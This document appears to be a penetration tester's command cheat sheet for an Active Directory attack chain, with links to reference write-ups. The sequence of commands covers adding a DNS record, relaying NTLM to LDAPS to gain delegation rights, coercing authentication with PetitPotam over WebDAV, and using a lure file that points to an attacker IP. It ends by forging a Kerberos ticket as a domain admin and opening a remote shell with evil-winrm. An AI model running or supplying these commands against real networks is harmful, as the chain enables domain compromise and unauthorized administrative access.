
##
#
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/authentication-coercion
#
https://mayfly277.github.io/posts/GOADv2-pwning-part13/
#
https://www.scip.ch/en/?labs.20220421
#
##

```

# setting up a DNS record in the domain, the zone I required was found in ForestDNSZones
python3 ./krbrelayx/dnstool.py -u DOMAIN\\zimnyaa -p <PASSWORD> -a add -r testrecord -d <MY_IP> --forest DC1.DOMAIN.local

# setting up a LDAPS relay to grant RBCD to computer account we have
# in my case MAQ = 0, so I escalated on a domain workstation and used it
sudo impacket-ntlmrelayx -smb2support -t ldaps://DC1.DOMAIN.local --http-port 8080 --delegate-access --escalate-user MYWS\$ --no-dump --no-acl --no-da

# PetitPotam to WebDAV with domain credentials (not patched)
# DO NOT use FQDN here
python3 PetitPotam.py -d DOMAIN.local -u zimnyaa -p <PASSWORD> testrecord@8080/a TARGETSERVER

# if WebClient is not enabled, you will get the error 0x7. You can try to enable it by viewing a .searchConnector-ms file from the server (if it's a terminal server, for example) or hosting it on a public share and waiting 


# Documents.searchConnector-ms example:
# <?xml version="1.0" encoding="UTF-8"?>
#                 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
#                     <iconReference>imageres.dll,-1002</iconReference>
#                     <description>Microsoft Outlook</description>
#                     <isSearchOnlyItem>false</isSearchOnlyItem>
#                     <includeInStartMenuScope>true</includeInStartMenuScope>
#                     <iconReference>\\YOUR_IP@8080\whatever.ico</iconReference>
#                     <templateInfo>
#                         <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
#                     </templateInfo>
#                     <simpleLocation>
#                         <url>\\YOUR_IP@8080\whatever.ico</url>
#                     </simpleLocation>
#                 </searchConnectorDescription>

# ccache obtained with Rubeus /tgtdeleg and converted with ticketConverter
export KRB5CCNAME=ws.ccache
impacket-getST -k -spn wsman/TARGETSERVER.DOMAIN.local -dc-ip DC_IP -impersonate domain_admin DOMAIN.local/MYWS\$


# after setting up a KDC krb5.conf as per evil-winrm install instructions
export KRB5CCNAME=domain_admin.ccache
evil-winrm -r DOMAIN.local -i TARGETSERVER.DOMAIN.local --spn wsman
